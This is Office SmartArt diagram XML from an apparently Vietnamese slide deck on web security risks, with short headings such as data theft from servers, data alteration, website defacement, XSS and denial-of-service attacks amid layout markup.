    <dgm:cxn modelId="{0A615020-2734-4C8E-9389-16915B6D9508}" srcId="{D064C300-B287-47B4-BA96-CC29F101EF59}" destId="{02FC16F2-001A-4983-8414-5FED92A5A82B}" srcOrd="0" destOrd="0" parTransId="{90B41A83-6E6D-40CC-A24A-9D218E53CBD9}" sibTransId="{B53B7C97-2481-4538-AF92-3A4BFBF83BBC}"/>
    <dgm:cxn modelId="{3ADD6F26-92E2-43EA-B378-9DA48D938D7B}" srcId="{D064C300-B287-47B4-BA96-CC29F101EF59}" destId="{00FB48F0-CE3D-4011-B6A3-BA60DC4CED09}" srcOrd="1" destOrd="0" parTransId="{A0F5B01D-9B28-4CFF-9F32-FD5C1636596A}" sibTransId="{FABA640C-1B94-47C3-8214-AB150FA01EE7}"/>
    <dgm:cxn modelId="{F737735B-CAC6-48C6-B39C-ABB50C11BC27}" srcId="{D064C300-B287-47B4-BA96-CC29F101EF59}" destId="{AACB945A-C79F-4AFC-A37F-878F31F9BD06}" srcOrd="2" destOrd="0" parTransId="{F057E2D6-9F9D-4A94-9E0C-BB71FBD6A32B}" sibTransId="{BC705829-E1EA-4F37-AB19-D85379C9CBD7}"/>
    <dgm:cxn modelId="{02BDE24F-6A86-4223-9A74-28C562E5A416}" type="presOf" srcId="{4270620F-10CA-4064-A21E-7BB1B894189A}" destId="{81D70254-BEED-4521-9FA1-36AAD3C7D81A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{C976F174-9245-423F-9339-5252FC00178D}" type="presOf" srcId="{AACB945A-C79F-4AFC-A37F-878F31F9BD06}" destId="{430CAFAF-EE92-4E60-998B-E4156AA5C7B4}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{FA8EFB87-52B8-4664-9DAB-79285755333A}" type="presOf" srcId="{02FC16F2-001A-4983-8414-5FED92A5A82B}" destId="{613F1B29-2607-4C75-8994-AA653EF6A94B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{BDA76B06-F1BE-4B78-90F7-5308E0B3D0C0}" type="presParOf" srcId="{79E4D48D-74D4-493C-BA36-2E5076C41D0C}" destId="{B86C2532-0AC6-48CA-8AC9-5DD11DC25520}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{6C4407CB-4887-4D6A-9491-D52EA46AF061}" type="presParOf" srcId="{B86C2532-0AC6-48CA-8AC9-5DD11DC25520}" destId="{D1EE4A30-9CCE-4815-8485-5E055953A693}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{24E41CE3-BE4B-46AB-BB2E-1C9AAF0D7DB1}" type="presParOf" srcId="{B86C2532-0AC6-48CA-8AC9-5DD11DC25520}" destId="{613F1B29-2607-4C75-8994-AA653EF6A94B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{2A761A18-0746-4469-A9DA-9B2AEA1A6AC4}" type="presParOf" srcId="{B86C2532-0AC6-48CA-8AC9-5DD11DC25520}" destId="{1D436C71-0B33-4691-BE6C-76BB5D3AA3BF}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{829C377A-6127-4C4D-9475-607089D7F877}" type="presParOf" srcId="{79E4D48D-74D4-493C-BA36-2E5076C41D0C}" destId="{1B4DBC93-C189-4B93-9ABF-24AF20444849}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{18A39607-3D2F-4C41-98A1-D76A6E68A949}" type="presParOf" srcId="{1B4DBC93-C189-4B93-9ABF-24AF20444849}" destId="{360E57D7-BD14-4971-9459-BF894B64A716}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{5FDAF5D2-E809-409C-9B91-1DA48F29200C}" type="presParOf" srcId="{79E4D48D-74D4-493C-BA36-2E5076C41D0C}" destId="{42A2C4CD-4165-45E3-B10E-627C355D3BEB}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{6471C4D7-1214-4621-94BA-9B59FBDA9D02}" type="presParOf" srcId="{42A2C4CD-4165-45E3-B10E-627C355D3BEB}" destId="{98A38C6B-B26C-4D98-81DE-A52B509FF70F}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{DBCA41FB-5491-4F92-9AF5-198189C454F3}" type="presParOf" srcId="{42A2C4CD-4165-45E3-B10E-627C355D3BEB}" destId="{833E858F-C498-45F8-B957-4322301E8F16}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{2D5B64FF-B927-40AE-9F88-7B2EE4BE27CE}" type="presParOf" srcId="{42A2C4CD-4165-45E3-B10E-627C355D3BEB}" destId="{AB6E4892-296E-419F-B1CD-CAFE60847FC3}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{68C3513D-9A8E-4CCB-AECC-2D74E33E284D}" type="presParOf" srcId="{79E4D48D-74D4-493C-BA36-2E5076C41D0C}" destId="{54CA2D53-F193-478E-846A-B4EFDC0E8DA0}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{029248F4-9563-46E2-9F0C-FC275A6FE44D}" type="presParOf" srcId="{54CA2D53-F193-478E-846A-B4EFDC0E8DA0}" destId="{A144F348-CB82-47B3-A7FB-F5801DAAEA12}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{7A05CACA-DA71-4D1B-B4EF-4202E393A1C1}" type="presParOf" srcId="{79E4D48D-74D4-493C-BA36-2E5076C41D0C}" destId="{9A38C0AF-87AD-4DA2-88AE-2D92235484C2}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{FC4060E8-463F-4E85-8F80-576ABD8F4469}" type="presParOf" srcId="{9A38C0AF-87AD-4DA2-88AE-2D92235484C2}" destId="{13221F77-E1DF-45C9-ACE5-B4735A822FFD}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{70ED2AE4-0C05-4F1F-BF03-7727E468CDC1}" type="presParOf" srcId="{9A38C0AF-87AD-4DA2-88AE-2D92235484C2}" destId="{430CAFAF-EE92-4E60-998B-E4156AA5C7B4}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{3123E287-B003-4914-B011-D9C03410B8BF}" type="presParOf" srcId="{9A38C0AF-87AD-4DA2-88AE-2D92235484C2}" destId="{34E767A6-DAE0-445C-B2D3-B28EABE1A0F6}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{A753F871-9D65-4064-86A7-42C037E8C803}" type="presParOf" srcId="{79E4D48D-74D4-493C-BA36-2E5076C41D0C}" destId="{E0142E3B-755D-4D89-B7CA-8081ECC9C2D8}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{571B770B-26A0-4DC7-89DA-D3EA4C52A5BB}" type="presParOf" srcId="{E0142E3B-755D-4D89-B7CA-8081ECC9C2D8}" destId="{E4E406F8-8DB7-469B-B68B-BA5CA05B2772}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{9D012158-A1E0-4C72-8C3D-9FC42ED18759}" type="presParOf" srcId="{79E4D48D-74D4-493C-BA36-2E5076C41D0C}" destId="{2F371C9D-EA4E-47D0-9598-54AF0C9F60D5}" srcOrd="6" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{26BC9B1F-68FA-41EE-B9E2-E6E9FCB2E9AF}" type="presParOf" srcId="{2F371C9D-EA4E-47D0-9598-54AF0C9F60D5}" destId="{7405AA7C-5713-4D74-8F26-92568F109EA9}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{AB60E404-5983-44C6-84AD-5C3B39760268}" type="presParOf" srcId="{2F371C9D-EA4E-47D0-9598-54AF0C9F60D5}" destId="{81D70254-BEED-4521-9FA1-36AAD3C7D81A}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUp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2D479C2-2B41-421C-A841-4BC782471F5D}" type="doc">
      <dgm:prSet loTypeId="urn:microsoft.com/office/officeart/2005/8/layout/vList5" loCatId="list" qsTypeId="urn:microsoft.com/office/officeart/2005/8/quickstyle/simple1" qsCatId="simple" csTypeId="urn:microsoft.com/office/officeart/2005/8/colors/accent2_4" csCatId="accent2" phldr="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E09AF46A-26E8-4C48-8F4C-0BEEDD548705}">
      <dgm:prSet/>
      <dgm:spPr>
        <a:solidFill>
          <a:srgbClr val="C00000"/>
        </a:solidFill>
      </dgm:spPr>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr rtl="0"/>
          <a:r>
            <a:rPr lang="en-US"/>
            <a:t>Mục đích</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9F3416EB-338C-4C13-BE64-9FB8BCEC6986}" type="parTrans" cxnId="{57EB4E4F-E358-4145-9893-406E3D3C0026}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{00340FC5-E1C1-4F4F-9F5D-8DD15512E5D0}" type="sibTrans" cxnId="{57EB4E4F-E358-4145-9893-406E3D3C0026}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3082A499-5EDF-4DAB-8A65-BE194F1A95E8}">
      <dgm:prSet custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr rtl="0"/>
          <a:r>
            <a:rPr lang="en-US" sz="2500">
              <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Đánh cắp dữ liệu từ Server</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{15E231F8-5603-4722-BC04-6A714BD78E74}" type="parTrans" cxnId="{C50F84E5-27C7-4367-A90B-2576AB3AEEDA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{71719532-F6F3-48E1-AC11-951B2D7B3CB8}" type="sibTrans" cxnId="{C50F84E5-27C7-4367-A90B-2576AB3AEEDA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DD0536A6-233D-4096-A1CD-54974931B8E8}">
      <dgm:prSet custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr rtl="0"/>
          <a:r>
            <a:rPr lang="en-US" sz="2500">
              <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Thay đổi dữ liệu</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5BEA9701-BCC6-4457-BE30-011747DE4CF1}" type="parTrans" cxnId="{E2C2DAE6-50A1-4CEC-9B49-CA9ACBC57BAB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B853C46E-1030-4F7D-80EF-18DA08EB07FD}" type="sibTrans" cxnId="{E2C2DAE6-50A1-4CEC-9B49-CA9ACBC57BAB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{59452DC5-7686-4A98-8C81-3DD358D61666}">
      <dgm:prSet custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr rtl="0"/>
          <a:r>
            <a:rPr lang="en-US" sz="2500">
              <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Deface website</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BA628BCD-B4DC-4FAF-AAE8-EFD3DB8ED2A5}" type="parTrans" cxnId="{4F7CC002-7E66-4973-A435-00767FA56D96}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{550B80CC-6B81-4773-BE20-6B88905EAAA2}" type="sibTrans" cxnId="{4F7CC002-7E66-4973-A435-00767FA56D96}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5A2D17AE-085D-4604-8F9C-B8A8E0B0C72E}" type="pres">
      <dgm:prSet presAssocID="{52D479C2-2B41-421C-A841-4BC782471F5D}" presName="Name0" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{84ABAE7A-B608-41F7-A704-05CDF891BE5C}" type="pres">
      <dgm:prSet presAssocID="{E09AF46A-26E8-4C48-8F4C-0BEEDD548705}" presName="linNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{624CBC54-9F06-4847-9A24-39413A353611}" type="pres">
      <dgm:prSet presAssocID="{E09AF46A-26E8-4C48-8F4C-0BEEDD548705}" presName="parentText" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="1" custLinFactNeighborX="-28635" custLinFactNeighborY="-4560">
        <dgm:presLayoutVars>
          <dgm:chMax val="1"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{40CC5684-3C74-44E4-9C37-D23146F54300}" type="pres">
      <dgm:prSet presAssocID="{E09AF46A-26E8-4C48-8F4C-0BEEDD548705}" presName="descendantText" presStyleLbl="alignAccFollowNode1" presStyleIdx="0" presStyleCnt="1">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{4F7CC002-7E66-4973-A435-00767FA56D96}" srcId="{E09AF46A-26E8-4C48-8F4C-0BEEDD548705}" destId="{59452DC5-7686-4A98-8C81-3DD358D61666}" srcOrd="2" destOrd="0" parTransId="{BA628BCD-B4DC-4FAF-AAE8-EFD3DB8ED2A5}" sibTransId="{550B80CC-6B81-4773-BE20-6B88905EAAA2}"/>
    <dgm:cxn modelId="{C04C5928-1943-4A22-BAEC-0917D449C708}" type="presOf" srcId="{59452DC5-7686-4A98-8C81-3DD358D61666}" destId="{40CC5684-3C74-44E4-9C37-D23146F54300}" srcOrd="0" destOrd="2" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList5"/>
    <dgm:cxn modelId="{57EB4E4F-E358-4145-9893-406E3D3C0026}" srcId="{52D479C2-2B41-421C-A841-4BC782471F5D}" destId="{E09AF46A-26E8-4C48-8F4C-0BEEDD548705}" srcOrd="0" destOrd="0" parTransId="{9F3416EB-338C-4C13-BE64-9FB8BCEC6986}" sibTransId="{00340FC5-E1C1-4F4F-9F5D-8DD15512E5D0}"/>
    <dgm:cxn modelId="{63996A8D-9961-4DEC-8D2A-B0009A5D82C2}" type="presOf" srcId="{E09AF46A-26E8-4C48-8F4C-0BEEDD548705}" destId="{624CBC54-9F06-4847-9A24-39413A353611}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList5"/>
    <dgm:cxn modelId="{744547BC-E926-439E-A1DF-DF528DA921FF}" type="presOf" srcId="{3082A499-5EDF-4DAB-8A65-BE194F1A95E8}" destId="{40CC5684-3C74-44E4-9C37-D23146F54300}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList5"/>
    <dgm:cxn modelId="{C50F84E5-27C7-4367-A90B-2576AB3AEEDA}" srcId="{E09AF46A-26E8-4C48-8F4C-0BEEDD548705}" destId="{3082A499-5EDF-4DAB-8A65-BE194F1A95E8}" srcOrd="0" destOrd="0" parTransId="{15E231F8-5603-4722-BC04-6A714BD78E74}" sibTransId="{71719532-F6F3-48E1-AC11-951B2D7B3CB8}"/>
    <dgm:cxn modelId="{E2C2DAE6-50A1-4CEC-9B49-CA9ACBC57BAB}" srcId="{E09AF46A-26E8-4C48-8F4C-0BEEDD548705}" destId="{DD0536A6-233D-4096-A1CD-54974931B8E8}" srcOrd="1" destOrd="0" parTransId="{5BEA9701-BCC6-4457-BE30-011747DE4CF1}" sibTransId="{B853C46E-1030-4F7D-80EF-18DA08EB07FD}"/>
    <dgm:cxn modelId="{F35C6DEB-88F4-45BA-89EF-A3CAC127E94E}" type="presOf" srcId="{DD0536A6-233D-4096-A1CD-54974931B8E8}" destId="{40CC5684-3C74-44E4-9C37-D23146F54300}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList5"/>
    <dgm:cxn modelId="{31F253EC-6695-4C5D-BE2B-A25F6A40BB32}" type="presOf" srcId="{52D479C2-2B41-421C-A841-4BC782471F5D}" destId="{5A2D17AE-085D-4604-8F9C-B8A8E0B0C72E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList5"/>
    <dgm:cxn modelId="{37DD1024-4FCA-4701-92A2-3EA3F8EEB6C1}" type="presParOf" srcId="{5A2D17AE-085D-4604-8F9C-B8A8E0B0C72E}" destId="{84ABAE7A-B608-41F7-A704-05CDF891BE5C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList5"/>
    <dgm:cxn modelId="{900C278E-6090-4A18-A2F8-89D9791FD5AC}" type="presParOf" srcId="{84ABAE7A-B608-41F7-A704-05CDF891BE5C}" destId="{624CBC54-9F06-4847-9A24-39413A353611}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList5"/>
    <dgm:cxn modelId="{37A39EBA-CB11-440E-9899-B698860AC6D1}" type="presParOf" srcId="{84ABAE7A-B608-41F7-A704-05CDF891BE5C}" destId="{40CC5684-3C74-44E4-9C37-D23146F54300}"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94D8596-48D0-486B-8783-2ADF0883213C}" type="doc">
      <dgm:prSet loTypeId="urn:microsoft.com/office/officeart/2005/8/layout/list1" loCatId="list" qsTypeId="urn:microsoft.com/office/officeart/2005/8/quickstyle/simple1" qsCatId="simple" csTypeId="urn:microsoft.com/office/officeart/2005/8/colors/accent2_1" csCatId="accent2" phldr="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}">
      <dgm:prSet custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr algn="ctr">
            <a:buAutoNum type="arabicPeriod"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="3500" b="1"/>
            <a:t>3. Nguy cơ tấn công XSS</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9EC7B965-5D54-470D-B689-C0BA2FABFCA1}" type="parTrans" cxnId="{90402C88-81A9-4F97-9826-AB2628608667}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B6D24611-8D24-4857-ACF5-3F6B886E8F6D}" type="sibTrans" cxnId="{90402C88-81A9-4F97-9826-AB2628608667}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" type="pres">
      <dgm:prSet presAssocID="{D94D8596-48D0-486B-8783-2ADF0883213C}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{24BDE9BE-48E6-405E-8AF0-A28B29ED8C66}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="1"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CE841021-028B-435A-A662-9D12B985022C}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="parentText" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="1" custScaleX="96200">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A3476D70-817C-46D0-A1BE-6AE9D5D978FD}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7D76A578-B55C-43EC-B2A0-551426FD04BF}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="1">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{9220FA34-72C9-4A40-B520-9C639D661416}" type="presOf" srcId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" destId="{24BDE9BE-48E6-405E-8AF0-A28B29ED8C66}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{E080B942-606C-4280-A576-C4F1448F092F}" type="presOf" srcId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" destId="{CE841021-028B-435A-A662-9D12B985022C}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{90402C88-81A9-4F97-9826-AB2628608667}" srcId="{D94D8596-48D0-486B-8783-2ADF0883213C}" destId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" srcOrd="0" destOrd="0" parTransId="{9EC7B965-5D54-470D-B689-C0BA2FABFCA1}" sibTransId="{B6D24611-8D24-4857-ACF5-3F6B886E8F6D}"/>
    <dgm:cxn modelId="{F98357D8-9078-49C5-8F20-FEA8AF459132}" type="presOf" srcId="{D94D8596-48D0-486B-8783-2ADF0883213C}" destId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{2B0CEF6D-61B2-446A-AE80-1DED1E50C91C}" type="presParOf" srcId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" destId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{AD6D83A4-3178-4B60-856A-BE2D20A0D6C9}" type="presParOf" srcId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" destId="{24BDE9BE-48E6-405E-8AF0-A28B29ED8C66}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{6953A462-9333-489C-A223-91E26F5C801E}" type="presParOf" srcId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" destId="{CE841021-028B-435A-A662-9D12B985022C}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{A349FC73-76E5-4A89-A6AF-64B0FF8CE1AF}" type="presParOf" srcId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" destId="{A3476D70-817C-46D0-A1BE-6AE9D5D978FD}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8CA1C34B-36F5-4703-BC69-D5D8D6471459}" type="presParOf" srcId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" destId="{7D76A578-B55C-43EC-B2A0-551426FD04BF}"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D94D8596-48D0-486B-8783-2ADF0883213C}" type="doc">
      <dgm:prSet loTypeId="urn:microsoft.com/office/officeart/2005/8/layout/list1" loCatId="list" qsTypeId="urn:microsoft.com/office/officeart/2005/8/quickstyle/simple1" qsCatId="simple" csTypeId="urn:microsoft.com/office/officeart/2005/8/colors/accent2_1" csCatId="accent2" phldr="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}">
      <dgm:prSet custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr algn="ctr">
            <a:buAutoNum type="arabicPeriod"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="3500" b="1"/>
            <a:t>5. Nguy cơ tấn công </a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:pPr algn="ctr">
            <a:buAutoNum type="arabicPeriod"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="3500" b="1"/>
            <a:t>từ chối dịch vụ</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="3500"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9EC7B965-5D54-470D-B689-C0BA2FABFCA1}" type="parTrans" cxnId="{90402C88-81A9-4F97-9826-AB2628608667}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
